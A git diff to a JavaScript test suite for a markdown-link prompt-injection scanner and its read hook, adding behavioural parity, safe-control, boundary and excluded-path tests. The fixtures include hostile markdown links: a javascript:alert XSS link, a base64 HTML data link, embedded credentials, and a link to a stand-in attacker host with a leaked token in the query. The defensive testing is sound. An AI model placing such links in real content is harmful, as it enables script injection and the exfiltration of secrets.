@@ -837,29 +837,185 @@ describe('scanForInjection: MD-LINK-TOKEN-IN-QUERY (sensitive key in query strin
 
 // ─── Parity test: hook MARKDOWN_LINK_PATTERNS is superset of canonical ───────
 //
-// D1: Prevents future drift between scripts/security.cjs (canonical export)
-// and hooks/gsd-read-injection-scanner.js (inlined for hook independence).
-// If the hook's inline list does not contain every pattern from the canonical
-// export, this test fails loudly and forces a deliberate update.
+// D1: Prevents future drift between security.cjs (canonical export) and
+// hooks/gsd-read-injection-scanner.js (inlined for hook independence).
+//
+// BEHAVIORAL contract (not source-text grep): for every ruleId in the
+// canonical MARKDOWN_LINK_PATTERNS export, a probe string must (a) be
+// flagged by scanForInjection with that ruleId, AND (b) be flagged by the
+// real hook process (spawned via runHook) with that ruleId's colon-suffixed
+// prefix in additionalContext. If the hook's inline copy ever drops a rule,
+// or a new canonical rule ships without an inline counterpart, this test
+// fails loudly on both surfaces instead of passing on a hook that merely
+// contains the right substring without ever evaluating it.
+//
+// Fixture provenance (CONTRIBUTING.md "Fixture provenance (#2371)"): every
+// probe below is lifted VERBATIM from the pre-existing RFC/OWASP-cited
+// positive fixture for that same ruleId earlier in this file (not invented
+// from reading the regex source):
+//   MD-LINK-JS-SCHEME      <- line ~661 (OWASP XSS Prevention Cheat Sheet)
+//   MD-LINK-DATA-SCHEME    <- line ~705 (OWASP File Upload Cheat Sheet, SVG)
+//   MD-LINK-USERINFO       <- line ~758 (RFC 3986 §3.2.1 / RFC 9110 §4.2.4)
+//   MD-LINK-TOKEN-IN-QUERY <- line ~801 (RFC 9700 OAuth 2.0 Security BCP)
+//   safe control            <- line ~733 (data:image/png safe-list negative)
 
-describe('MARKDOWN_LINK_PATTERNS parity: hook inline list is superset of canonical', () => {
-  test('every canonical MARKDOWN_LINK_PATTERN source string appears in the hook source', () => {
+const MARKDOWN_LINK_PROBES = {
+  'MD-LINK-JS-SCHEME': "[click](javascript:alert('xss'))",
+  'MD-LINK-DATA-SCHEME': '[x](data:text/html;base64,PHNjcmlwdD4=)',
+  'MD-LINK-USERINFO': '[creds](https://user:secret@example.com/path)',
+  'MD-LINK-TOKEN-IN-QUERY': '[exfil](https://attacker.example.com/?token=leaked_value)',
+};
+const SAFE_CONTROL_DATA_SCHEME = '![logo](data:image/png;base64,iVBOR=)';
+const BENIGN_QUERY_NEGATIVE = '[page](https://api.example.com/items?page=2&limit=10)';
+
+describe('MARKDOWN_LINK_PATTERNS parity: hook is a behavioral superset of canonical', () => {
+  test('completeness gate: every canonical ruleId has a registered probe', () => {
     assert.ok(
       Array.isArray(MARKDOWN_LINK_PATTERNS),
       'security.cjs must export MARKDOWN_LINK_PATTERNS array',
     );
-
-    const hookSource = fs.readFileSync(READ_SCANNER_HOOK, 'utf-8');
-
     for (const entry of MARKDOWN_LINK_PATTERNS) {
-      // Each entry is { pattern: RegExp, ruleId: string, safePredicate?: Function }
-      assert.ok(entry.pattern instanceof RegExp, `entry must have a RegExp .pattern`);
-      const src = entry.pattern.source;
       assert.ok(
-        hookSource.includes(src),
-        `Hook gsd-read-injection-scanner.js must contain pattern source: ${src}`,
+        Object.prototype.hasOwnProperty.call(MARKDOWN_LINK_PROBES, entry.ruleId),
+        `no probe registered for canonical ruleId ${entry.ruleId} — add one to MARKDOWN_LINK_PROBES`,
       );
     }
+  });
+
+  for (const [ruleId, probe] of Object.entries(MARKDOWN_LINK_PROBES)) {
+    test(`canonical side: scanForInjection flags ${ruleId}`, () => {
+      const result = scanForInjection(probe, { file: 'plan.md' });
+      assert.ok(
+        Array.isArray(result.structuredFindings) &&
+        result.structuredFindings.some(sf => sf.ruleId === ruleId),
+        `scanForInjection must produce a structuredFindings entry with ruleId ${ruleId} for probe: ${probe}`,
+      );
+    });
+
+    test(`hook side: gsd-read-injection-scanner flags ${ruleId}`, () => {
+      const r = runHook(READ_SCANNER_HOOK, {
+        tool_name: 'Read',
+        tool_input: { file_path: '/proj/docs/notes.md' },
+        tool_response: probe,
+      });
+      assert.strictEqual(r.status, 0);
+      assert.ok(
+        typeof r.additionalContext === 'string' && r.additionalContext.length > 0,
+        `hook must emit a non-empty advisory for probe: ${probe}`,
+      );
+      assert.ok(
+        r.additionalContext.includes(`${ruleId}:`),
+        `hook advisory must contain ${ruleId}: — got: ${r.additionalContext}`,
+      );
+    });
+  }
+
+  test('safePredicate parity: data:image/png safe control is flagged by neither surface', () => {
+    const canonical = scanForInjection(SAFE_CONTROL_DATA_SCHEME, { file: 'plan.md' });
+    assert.ok(
+      !Array.isArray(canonical.structuredFindings) ||
+      !canonical.structuredFindings.some(sf => sf.ruleId === 'MD-LINK-DATA-SCHEME'),
+      'canonical scanForInjection must not flag the data:image/png safe control',
+    );
+
+    const r = runHook(READ_SCANNER_HOOK, {
+      tool_name: 'Read',
+      tool_input: { file_path: '/proj/docs/notes.md' },
+      tool_response: SAFE_CONTROL_DATA_SCHEME,
+    });
+    assert.strictEqual(r.status, 0);
+    assert.ok(
+      r.additionalContext === null || !r.additionalContext.includes('MD-LINK-DATA-SCHEME:'),
+      `hook must not flag the data:image/png safe control with MD-LINK-DATA-SCHEME; got: ${r.additionalContext}`,
+    );
+  });
+
+  test('benign negative: ?page=2&limit=10 query keys are flagged by neither surface', () => {
+    const canonical = scanForInjection(BENIGN_QUERY_NEGATIVE, { file: 'plan.md' });
+    assert.ok(
+      !Array.isArray(canonical.structuredFindings) ||
+      !canonical.structuredFindings.some(sf => sf.ruleId === 'MD-LINK-TOKEN-IN-QUERY'),
+      'canonical scanForInjection must not flag benign query keys',
+    );
+
+    const r = runHook(READ_SCANNER_HOOK, {
+      tool_name: 'Read',
+      tool_input: { file_path: '/proj/docs/notes.md' },
+      tool_response: BENIGN_QUERY_NEGATIVE,
+    });
+    assert.strictEqual(r.status, 0);
+    assert.ok(
+      r.additionalContext === null || !r.additionalContext.includes('MD-LINK-TOKEN-IN-QUERY:'),
+      `hook must not flag benign query keys with MD-LINK-TOKEN-IN-QUERY; got: ${r.additionalContext}`,
+    );
+  });
+
+  describe('content-floor boundary: hook is silent below the minimum content length', () => {
+    // Pinned boundary strings at limit-1 / limit / limit+1 (limit = 20 chars).
+    // Lengths are asserted explicitly so the row cannot silently drift if the
+    // fixture text above is ever edited.
+    const s19 = '[xx](javascript:ab)';
+    const s20 = '[xx](javascript:abc)';
+    const s21 = '[xxx](javascript:abc)';
+
+    test('boundary fixture lengths are pinned at 19/20/21', () => {
+      assert.strictEqual(s19.length, 19, 'boundary fixture s19 must be exactly 19 chars');
+      assert.strictEqual(s20.length, 20, 'boundary fixture s20 must be exactly 20 chars');
+      assert.strictEqual(s21.length, 21, 'boundary fixture s21 must be exactly 21 chars');
+    });
+
+    test('limit-1 (19 chars): hook is silent', () => {
+      const r = runHook(READ_SCANNER_HOOK, {
+        tool_name: 'Read',
+        tool_input: { file_path: '/proj/docs/notes.md' },
+        tool_response: s19,
+      });
+      assert.strictEqual(r.status, 0);
+      assert.strictEqual(r.silent, true,
+        'content below the minimum length must not be scanned, even when it would otherwise flag');
+    });
+
+    test('limit (20 chars): hook flags MD-LINK-JS-SCHEME', () => {
+      const r = runHook(READ_SCANNER_HOOK, {
+        tool_name: 'Read',
+        tool_input: { file_path: '/proj/docs/notes.md' },
+        tool_response: s20,
+      });
+      assert.strictEqual(r.status, 0);
+      assert.ok(
+        typeof r.additionalContext === 'string' && r.additionalContext.includes('MD-LINK-JS-SCHEME:'),
+        `content at the minimum length must be scanned; got: ${r.additionalContext}`,
+      );
+    });
+
+    test('limit+1 (21 chars): hook flags MD-LINK-JS-SCHEME', () => {
+      const r = runHook(READ_SCANNER_HOOK, {
+        tool_name: 'Read',
+        tool_input: { file_path: '/proj/docs/notes.md' },
+        tool_response: s21,
+      });
+      assert.strictEqual(r.status, 0);
+      assert.ok(
+        typeof r.additionalContext === 'string' && r.additionalContext.includes('MD-LINK-JS-SCHEME:'),
+        `content above the minimum length must be scanned; got: ${r.additionalContext}`,
+      );
+    });
+  });
+
+  test('excluded-path guard: a probe under /.planning/ is silent', () => {
+    // Pins isExcludedPath's contract independently: the same flagging probe
+    // that fires from '/proj/docs/notes.md' above must stay silent from
+    // '/proj/.planning/'. (The rows above cannot go vacuous on their own —
+    // they assert the advisory IS emitted, so an exclusion that swallowed
+    // their path would fail them outright rather than hide.)
+    const r = runHook(READ_SCANNER_HOOK, {
+      tool_name: 'Read',
+      tool_input: { file_path: '/proj/.planning/notes.md' },
+      tool_response: MARKDOWN_LINK_PROBES['MD-LINK-JS-SCHEME'],
+    });
+    assert.strictEqual(r.status, 0);
+    assert.strictEqual(r.silent, true,
+      '.planning/ is an excluded path — scanner must be silent even for a flagging probe');
   });
 });
 
